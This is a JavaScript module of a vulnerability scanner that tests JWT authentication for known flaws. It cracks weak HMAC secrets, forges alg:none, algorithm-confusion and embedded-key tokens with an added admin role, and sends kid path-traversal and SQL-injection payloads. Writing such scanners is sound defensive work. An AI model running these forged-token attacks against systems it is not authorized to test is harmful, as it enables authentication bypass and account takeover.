// Dark Matter rule-based scanner — JWT authentication attacks probe.
// Tests JSON Web Tokens for known CVE patterns using differential
// oracles per the 100% truth rule: alg:none (CVE-2015-9235), empty
// signature, RS256→HS256 confusion (CVE-2016-10555), weak HMAC
// secrets, kid traversal / kid SQLi (CVE-2021-46743), embedded JWK,
// jku key-server trust, and expired-token acceptance, plus static
// claim hygiene.
//
// Network legs test against the URL the JWT came from
// (opts.testEndpoint overrides it for a lab harness). All are
// read-only GETs carrying a forged Authorization header — no state
// change, no lab gate. The jku leg is the exception: it needs a
// caller-supplied key server (opts.jkuUrl + opts.jkuKey, PEM
// private key); without one it is skipped — the scanner has no
// public listener of its own. New legs (T3/T5/T6/expired) run once
// per probe call, on the first token with an auth context, to bound
// requests; T1/T2 keep their existing per-token behaviour.
import crypto from 'node:crypto';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const JWT_RE = /eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*/g;

// Predefined weak secrets for offline HMAC cracking (~40 entries)
const WEAK_SECRETS = [
  'secret', 'password', '123456', '1234567890', 'development', 'staging',
  'test', 'jwt', 'qwerty', 'changeme', 'admin', 'letmein', '123456789',
  'mysupersecret', 'secret123', 'password123', 'jwtsecret', 'mysecret',
  'supersecret', 'topsecret', 'private', 'key', 'token', 'auth',
  '12345678', 'abc123', 'password1', 'admin123', 'root', 'toor',
  'default', 'demo', 'guest', 'user', 'test123', 'secretkey',
  'jwt_secret', 'appsecret', 'apisecret', 'hunter2',
];

function b64urlDecode(s) {
  // Convert base64url to base64 and decode
  const b64 = s.replace(/-/g, '+').replace(/_/g, '/');
  const pad = b64.length % 4;
  const padded = pad ? b64 + '='.repeat(4 - pad) : b64;
  return Buffer.from(padded, 'base64').toString('utf8');
}

function b64urlEncode(buf) {
  return Buffer.from(buf).toString('base64')
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function decodeJwt(token) {
  try {
    const parts = token.split('.');
    if (parts.length < 2) return null;
    const header = JSON.parse(b64urlDecode(parts[0]));
    const payload = JSON.parse(b64urlDecode(parts[1]));
    const signature = parts[2] || '';
    return { header, payload, signature, parts };
  } catch {
    return null;
  }
}

function findJwts(text) {
  const matches = text.match(JWT_RE) || [];
  // Deduplicate and filter to plausible JWTs (must decode)
  const seen = new Set();
  const out = [];
  for (const m of matches) {
    if (seen.has(m)) continue;
    seen.add(m);
    const decoded = decodeJwt(m);
    if (decoded && decoded.header && typeof decoded.header.alg === 'string') {
      out.push({ token: m, ...decoded });
    }
  }
  return out;
}

async function fetchWithTimeout(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
      method: opts.method || 'GET',
      body: opts.body,
    });
    const text = await res.text().catch(() => '');
    return { ok: true, status: res.status, headers: res.headers, text };
  } catch (e) {
    return { ok: false, error: e.message };
  } finally {
    clearTimeout(t);
  }
}

function signHs256(header, payload, secret) {
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const signingInput = `${h}.${p}`;
  const sig = crypto.createHmac('sha256', secret).update(signingInput).digest();
  return `${signingInput}.${b64urlEncode(sig)}`;
}

function signRs256(header, payload, privateKeyPem) {
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const signingInput = `${h}.${p}`;
  const sig = crypto.sign('RSA-SHA256', Buffer.from(signingInput), privateKeyPem);
  return `${signingInput}.${b64urlEncode(sig)}`;
}

// Differential oracle shared by the network legs: baseline accepted,
// garbage-signature control rejected, forged token accepted.
function differentialConfirmed(baselineRes, garbageRes, forgedRes) {
  return baselineRes.ok && baselineRes.status === 200 &&
    garbageRes.ok && garbageRes.status !== 200 &&
    forgedRes.ok && forgedRes.status === 200;
}

async function bearerGet(url, token, opts, timeoutMs) {
  return fetchWithTimeout(url, {
    timeoutMs,
    headers: { ...(opts.headers || {}), Authorization: `Bearer ${token}` },
  });
}

// Fetch the target's JWKS: direct jwks.json first, then the
// openid-configuration discovery document. Returns an array of JWK
// objects (possibly empty — the caller treats that as "no key found").
async function fetchJwks(origin, timeoutMs) {
  const urls = [`${origin}/.well-known/jwks.json`];
  try {
    const conf = await fetchWithTimeout(`${origin}/.well-known/openid-configuration`, { timeoutMs });
    if (conf.ok && conf.status === 200) {
      const parsed = JSON.parse(conf.text);
      if (parsed && typeof parsed.jwks_uri === 'string' && !urls.includes(parsed.jwks_uri)) {
        urls.push(parsed.jwks_uri);
      }
    }
  } catch { /* discovery is best-effort; jwks.json is tried next */ }
  for (const u of urls) {
    try {
      const res = await fetchWithTimeout(u, { timeoutMs });
      if (!res.ok || res.status !== 200) continue;
      const parsed = JSON.parse(res.text);
      if (parsed && Array.isArray(parsed.keys) && parsed.keys.length > 0) return parsed.keys;
    } catch { /* try the next URL */ }
  }
  return [];
}

// Public-key bytes of a JWK, for use as an HMAC secret (the confusion
// primitive: a server that verifies HS256 with its RS256 public key).
// RSA/EC keys come back as SPKI DER; symmetric (oct) keys decode from k.
function jwkToHmacSecret(jwk) {
  if (!jwk || typeof jwk !== 'object') return null;
  if (jwk.kty === 'oct' && typeof jwk.k === 'string') {
    try {
      return Buffer.from(jwk.k.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
    } catch {
      return null;
    }
  }
  try {
    const key = crypto.createPublicKey({ key: jwk, format: 'jwk' });
    return key.export({ type: 'spki', format: 'der' });
  } catch {
    return null;
  }
}

export async function probeJwt(url, opts = {}) {
  const findings = [];
  const timeoutMs = opts.timeoutMs || 15000;
  // Step 1: Fetch the target and find JWTs
  const res = await fetchWithTimeout(url, { timeoutMs, headers: opts.headers });
  if (!res.ok) return findings;

  const jwts = findJwts(res.text);
  // Also check Set-Cookie headers for JWTs
  const setCookie = res.headers.get('set-cookie') || '';
  const cookieJwts = findJwts(setCookie);
  
  const allJwts = [...jwts];
  for (const cj of cookieJwts) {
    if (!allJwts.some(j => j.token === cj.token)) allJwts.push(cj);
  }

  if (allJwts.length === 0) return findings;

  // For each JWT found, run the sub-tests
  for (const [jwtIndex, jwt] of allJwts.slice(0, 3).entries()) { // Limit to 3 tokens to avoid overload
    const { header, payload, signature, parts, token } = jwt;
    const alg = (header.alg || '').toUpperCase();
    // Weak secret cracked by T4 (if any) — reused by the expired-token leg.
    let crackedSecret = null;

    // T7: Static claim hygiene (no network needed) — run first as it's cheapest
    if (!payload.exp) {
      findings.push({
        class: 'jwt_claim_hygiene',
        id: `jwt-no-exp-${token.slice(0, 20)}`,
        title: 'JWT has no exp claim — tokens never expire',
        severity: 'medium',
        url,
        parameter: 'exp',
        evidence: {
          request: `GET ${url} (JWT capture)`,
          response: `JWT payload: ${JSON.stringify(payload).slice(0, 200)}`,
          impact_demo: 'Stolen tokens remain valid indefinitely; no expiration enforcement',
          signalCorrelated: true,
        },
      });
    }
    // Check for sensitive data in payload (base64 is not encryption)
    const payloadStr = JSON.stringify(payload).toLowerCase();
    const sensMatch = payloadStr.match(/password|ssn|credit|card/);
    if (sensMatch) {
      // Quote the FIELD NAME only — the value is PII and stays redacted.
      const fieldName = Object.keys(payload).find((k) => /password|ssn|credit|card/i.test(k)) || sensMatch[0];
      findings.push({
        class: 'jwt_claim_hygiene',
        id: `jwt-pii-${token.slice(0, 20)}`,
        title: 'JWT payload contains sensitive data (base64 is not encryption)',
        severity: 'low',
        url,
        parameter: 'payload',
        evidence: {
          request: `GET ${url} (JWT capture)`,
          response: `JWT payload contains sensitive field "${fieldName}" (value redacted — PII)`,
          impact_demo: 'Anyone with the token can read the payload — it is only base64-encoded',
          signalCorrelated: true,
        },
      });
    }

    // T4: Weak HMAC secret (fully offline) — only for HMAC algorithms
    if (['HS256', 'HS384', 'HS512'].includes(alg)) {
      const signingInput = `${parts[0]}.${parts[1]}`;
      const sigBuf = Buffer.from(
        signature.replace(/-/g, '+').replace(/_/g, '/'),
        'base64'
      );
      const hashAlg = alg === 'HS384' ? 'sha384' : alg === 'HS512' ? 'sha512' : 'sha256';
      
      for (const secret of WEAK_SECRETS) {
        const hmac = crypto.createHmac(hashAlg, secret);
        hmac.update(signingInput);
        const computed = hmac.digest();
        if (computed.length === sigBuf.length && crypto.timingSafeEqual(computed, sigBuf)) {
          crackedSecret = secret;
          findings.push({
            class: 'jwt_weak_secret',
            id: `jwt-weak-secret-${token.slice(0, 20)}`,
            title: `JWT HMAC secret cracked offline: '${secret}' (CVE pattern)`,
            severity: 'critical',
            url,
            parameter: 'signature',
            evidence: {
              request: `Offline HMAC-${hashAlg} crack (zero target requests)`,
              response: `Secret '${secret}' produces matching signature`,
              impact_demo: `Attacker can forge arbitrary JWTs with this secret — full authentication bypass`,
              signalCorrelated: true,
            },
          });
          break; // Found it, no need to try more
        }
      }
    }

    // T1 & T2 test against the URL the JWT came from — opts.testEndpoint
    // overrides it (lab harness). The comment used to claim this while
    // the code gated on opts.testEndpoint alone, so the legs were dead
    // in production; the wiring below matches the comment now.
    // Differential oracle: baseline (original) vs control (garbage sig) vs forged.

    // Only run network-based tests if we have a plausible auth context
    // (JWT in Authorization header pattern or cookie)
    const hasAuthContext = /authorization|bearer|cookie|set-cookie/i.test(res.text.slice(0, 2000)) ||
                           cookieJwts.length > 0;

    if (hasAuthContext) {
      const testUrl = opts.testEndpoint || url;
      
      // Baseline: original token should work (we assume 200)
      // Control: garbage signature should fail
      // Forged: alg:none should fail (if secure) or succeed (if vulnerable)
      
      const baselineRes = await fetchWithTimeout(testUrl, {
        timeoutMs,
        headers: { ...opts.headers, 'Authorization': `Bearer ${token}` },
      });
      
      // T1: alg:none
      const noneHeader = b64urlEncode(JSON.stringify({ ...header, alg: 'none' }));
      // Try to escalate: add admin role if not present
      const forgedPayload = { ...payload };
      if (!forgedPayload.role) forgedPayload.role = 'admin';
      const nonePayload = b64urlEncode(JSON.stringify(forgedPayload));
      const noneToken = `${noneHeader}.${nonePayload}.`;
      
      const noneRes = await fetchWithTimeout(testUrl, {
        timeoutMs,
        headers: { ...opts.headers, 'Authorization': `Bearer ${noneToken}` },
      });
      
      // Control: garbage signature
      const garbageToken = `${parts[0]}.${parts[1]}.garbagesignature123`;
      const garbageRes = await fetchWithTimeout(testUrl, {
        timeoutMs,
        headers: { ...opts.headers, 'Authorization': `Bearer ${garbageToken}` },
      });
      
      // Oracle: if baseline=200, garbage!=200, none=200 → VULNERABLE
      if (baselineRes.ok && baselineRes.status === 200 &&
          garbageRes.ok && garbageRes.status !== 200 &&
          noneRes.ok && noneRes.status === 200) {
        findings.push({
          class: 'jwt_alg_none',
          id: `jwt-alg-none-${token.slice(0, 20)}`,
          title: 'JWT alg:none accepted — authentication bypass (CVE-2015-9235)',
          severity: 'critical',
          url: testUrl,
          parameter: 'Authorization',
          evidence: {
            request: `GET ${testUrl} with Authorization: Bearer ${noneToken.slice(0, 50)}...`,
            response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
            impact_demo: 'Forged token with alg:none accepted — attacker can impersonate any user',
            signalCorrelated: true,
          },
        });
      }
      
      // T2: Empty signature
      const emptySigToken = `${parts[0]}.${parts[1]}.`;
      const emptyRes = await fetchWithTimeout(testUrl, {
        timeoutMs,
        headers: { ...opts.headers, 'Authorization': `Bearer ${emptySigToken}` },
      });
      if (baselineRes.ok && baselineRes.status === 200 &&
          garbageRes.ok && garbageRes.status !== 200 &&
          emptyRes.ok && emptyRes.status === 200) {
        findings.push({
          class: 'jwt_empty_signature',
          id: `jwt-empty-sig-${token.slice(0, 20)}`,
          title: 'JWT empty signature accepted — signature validation bypass',
          severity: 'high',
          url: testUrl,
          parameter: 'Authorization',
          evidence: {
            request: `GET ${testUrl} with empty signature`,
            response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
            impact_demo: 'Server checks signature presence, not validity',
            signalCorrelated: true,
          },
        });
      }

      // T3/T5/T6 + expired-token legs run once per probe call, on the
      // first token with an auth context, to bound requests.
      if (jwtIndex === 0) {
        // Try to escalate: add admin role if not present (shared by T3/T5/T6).
        const escalatedPayload = { ...payload };
        if (!escalatedPayload.role) escalatedPayload.role = 'admin';
        let confusionSecret = null;

        // T3: RS256→HS256 algorithm confusion (CVE-2016-10555).
        // Only for asymmetric algs: fetch the server public key from
        // its JWKS, re-sign HS256 using the public key bytes as the
        // HMAC secret, and run the same differential as T1.
        if (['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'].includes(alg)) {
          let origin = null;
          try { origin = new URL(url).origin; } catch { /* relative URL — skip T3 */ }
          if (origin) {
            const keys = await fetchJwks(origin, timeoutMs);
            const wantedKid = typeof header.kid === 'string' ? header.kid : null;
            const ordered = wantedKid
              ? [...keys.filter((k) => k.kid === wantedKid), ...keys.filter((k) => k.kid !== wantedKid)]
              : keys;
            for (const jwk of ordered.slice(0, 2)) {
              const secret = jwkToHmacSecret(jwk);
              if (!secret) continue;
              const forged = signHs256({ ...header, alg: 'HS256' }, escalatedPayload, secret);
              const forgedRes = await bearerGet(testUrl, forged, opts, timeoutMs);
              if (differentialConfirmed(baselineRes, garbageRes, forgedRes)) {
                findings.push({
                  class: 'jwt_alg_confusion',
                  id: `jwt-alg-confusion-${token.slice(0, 20)}`,
                  title: 'JWT RS256→HS256 algorithm confusion — public key accepted as HMAC secret (CVE-2016-10555)',
                  severity: 'critical',
                  url: testUrl,
                  parameter: 'Authorization',
                  evidence: {
                    request: `GET ${testUrl} with Authorization: Bearer <HS256 token signed with the RS256 public key>`,
                    response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
                    impact_demo: 'Anyone with the public key can forge arbitrary JWTs — full authentication bypass',
                    signalCorrelated: true,
                  },
                });
                confusionSecret = secret;
                break;
              }
            }
          }
        }

        // T5: kid header injection (CVE-2021-46743).
        // Traversal: kid points at /dev/null (empty key) — sign HS256
        // with the empty key; the server verifies only if it loads the
        // key from the injected path. SQLi: kid carries a UNION SELECT
        // for 'attacker_secret' — sign HS256 with that value; the
        // server verifies only if its key lookup returns it. The
        // /etc/passwd error-oracle variant is intentionally not
        // implemented: it has no confirmable oracle.
        const traversalToken = signHs256(
          { ...header, alg: 'HS256', kid: '../../../../../../dev/null' },
          escalatedPayload, '',
        );
        const travRes = await bearerGet(testUrl, traversalToken, opts, timeoutMs);
        if (differentialConfirmed(baselineRes, garbageRes, travRes)) {
          findings.push({
            class: 'jwt_kid_traversal',
            id: `jwt-kid-traversal-${token.slice(0, 20)}`,
            title: 'JWT kid path traversal — key loaded from attacker-controlled path (CVE-2021-46743)',
            severity: 'critical',
            url: testUrl,
            parameter: 'Authorization',
            evidence: {
              request: `GET ${testUrl} with kid ../../../../../../dev/null, HS256 signed with the empty key`,
              response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
              impact_demo: 'Attacker controls which key file verifies the token — full authentication bypass',
              signalCorrelated: true,
            },
          });
        }
        const sqliToken = signHs256(
          { ...header, alg: 'HS256', kid: `x' UNION SELECT 'attacker_secret' --` },
          escalatedPayload, 'attacker_secret',
        );
        const sqliRes = await bearerGet(testUrl, sqliToken, opts, timeoutMs);
        if (differentialConfirmed(baselineRes, garbageRes, sqliRes)) {
          findings.push({
            class: 'jwt_kid_sqli',
            id: `jwt-kid-sqli-${token.slice(0, 20)}`,
            title: 'JWT kid SQL injection — key lookup returns attacker-chosen secret (CVE-2021-46743)',
            severity: 'critical',
            url: testUrl,
            parameter: 'Authorization',
            evidence: {
              request: `GET ${testUrl} with kid x' UNION SELECT 'attacker_secret' --, HS256 signed with 'attacker_secret'`,
              response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
              impact_demo: 'Attacker controls which secret verifies the token — full authentication bypass',
              signalCorrelated: true,
            },
          });
        }

        // T6: embedded jwk — generate a throwaway RSA keypair, embed
        // the public JWK in the header, sign RS256 with the private
        // key. The server accepts only if it trusts attacker-supplied
        // keys.
        const jwkPair = crypto.generateKeyPairSync('rsa', {
          modulusLength: 2048,
          publicKeyEncoding: { type: 'spki', format: 'pem' },
          privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
        });
        const embeddedJwk = crypto.createPublicKey(jwkPair.publicKey).export({ format: 'jwk' });
        const jwkToken = signRs256({ ...header, alg: 'RS256', jwk: embeddedJwk }, escalatedPayload, jwkPair.privateKey);
        const jwkRes = await bearerGet(testUrl, jwkToken, opts, timeoutMs);
        if (differentialConfirmed(baselineRes, garbageRes, jwkRes)) {
          findings.push({
            class: 'jwt_embedded_jwk',
            id: `jwt-embedded-jwk-${token.slice(0, 20)}`,
            title: 'JWT embedded jwk accepted — server trusts attacker-supplied keys',
            severity: 'critical',
            url: testUrl,
            parameter: 'Authorization',
            evidence: {
              request: `GET ${testUrl} with an RS256 token carrying an attacker-generated jwk header`,
              response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
              impact_demo: 'Anyone can mint a keypair and forge arbitrary JWTs — full authentication bypass',
              signalCorrelated: true,
            },
          });
        }

        // T6: jku — needs a caller-supplied key server (opts.jkuUrl)
        // and the matching private key (opts.jkuKey, PEM). A lab
        // harness serves the JWKS; without one the leg is skipped —
        // the scanner has no public listener of its own. x5u shares
        // this seam pattern but is not implemented here (follow-up).
        if (opts.jkuUrl && opts.jkuKey) {
          const jkuToken = signRs256({ ...header, alg: 'RS256', jku: String(opts.jkuUrl) }, escalatedPayload, String(opts.jkuKey));
          const jkuRes = await bearerGet(testUrl, jkuToken, opts, timeoutMs);
          if (differentialConfirmed(baselineRes, garbageRes, jkuRes)) {
            findings.push({
              class: 'jwt_jku_trust',
              id: `jwt-jku-trust-${token.slice(0, 20)}`,
              title: 'JWT jku accepted — server trusts keys from an attacker-controlled URL',
              severity: 'critical',
              url: testUrl,
              parameter: 'Authorization',
              evidence: {
                request: `GET ${testUrl} with an RS256 token carrying jku ${opts.jkuUrl}`,
                response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
                impact_demo: 'Anyone hosting a key server can forge arbitrary JWTs — full authentication bypass',
                signalCorrelated: true,
              },
            });
          }
        }

        // Expired-token acceptance (#59): (a) the captured token's exp
        // is already past and the server still accepts it — direct
        // evidence, no forging needed; (b) re-sign with a past exp
        // using a key the server demonstrably trusts — the T4-cracked
        // weak secret, or the T3 confusion key. The static T7 no-exp
        // note is claim hygiene only and stays separate.
        const pastPayload = { ...payload, exp: Math.floor(Date.now() / 1000) - 3600 };
        if (typeof payload.exp === 'number' && payload.exp * 1000 < Date.now()) {
          if (baselineRes.ok && baselineRes.status === 200 &&
              garbageRes.ok && garbageRes.status !== 200) {
            findings.push({
              class: 'jwt_expired_accepted',
              id: `jwt-expired-${token.slice(0, 20)}`,
              title: 'JWT expired token accepted — expiry not verified',
              severity: 'high',
              url: testUrl,
              parameter: 'Authorization',
              evidence: {
                request: `GET ${testUrl} with the captured token (exp ${payload.exp}, already past)`,
                response: `HTTP 200 (garbage-sig ${garbageRes.status})`,
                impact_demo: 'Expired tokens remain usable — stolen tokens never stop working',
                signalCorrelated: true,
              },
            });
          }
        } else {
          const signingKeys = [];
          if (crackedSecret) {
            signingKeys.push({
              name: 'cracked weak secret',
              sign: (h, p) => signHs256(h, p, crackedSecret),
            });
          }
          if (confusionSecret) {
            signingKeys.push({
              name: 'RS256 public key as HMAC secret',
              sign: (h, p) => signHs256(h, p, confusionSecret),
            });
          }
          for (const { name, sign } of signingKeys) {
            const expiredToken = sign({ ...header, alg: 'HS256' }, pastPayload);
            const expiredRes = await bearerGet(testUrl, expiredToken, opts, timeoutMs);
            if (differentialConfirmed(baselineRes, garbageRes, expiredRes)) {
              findings.push({
                class: 'jwt_expired_accepted',
                id: `jwt-expired-${token.slice(0, 20)}`,
                title: 'JWT expired token accepted — expiry not verified',
                severity: 'high',
                url: testUrl,
                parameter: 'Authorization',
                evidence: {
                  request: `GET ${testUrl} with a token re-signed with exp in the past (${name})`,
                  response: `HTTP 200 (baseline 200, garbage-sig ${garbageRes.status})`,
                  impact_demo: 'Expired tokens remain usable — stolen tokens never stop working',
                  signalCorrelated: true,
                },
              });
              break;
            }
          }
        }
      }
    }
  }

  return findings;
}

// Export helpers for testing
export { decodeJwt, findJwts, b64urlDecode, b64urlEncode, WEAK_SECRETS };
